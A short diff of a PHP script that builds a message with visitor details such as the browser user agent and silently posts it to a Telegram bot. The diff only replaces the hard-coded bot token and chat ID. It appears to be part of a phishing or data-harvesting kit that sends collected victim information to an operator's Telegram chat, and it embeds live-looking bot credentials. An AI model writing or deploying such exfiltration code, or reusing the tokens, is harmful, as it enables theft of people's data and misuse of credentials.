@@ -16,11 +16,11 @@ $message .= "BROWSER  : ".(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_U
 
 $message .= "------------------------------------\n";
 
-$token = "8873240104:AAHoZ56Ciq_oFjiGMTDukHa15SMufHNejGc";
+$token = "9142645407:AAFVYD6en1Tf_OTQFxkz-JRA8mVOSw7Zvgg";
 
 $data = array(
     'text' => $message,
-    'chat_id' => '-5191651553'
+    'chat_id' => '-5325729427'
 );
 
 @file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
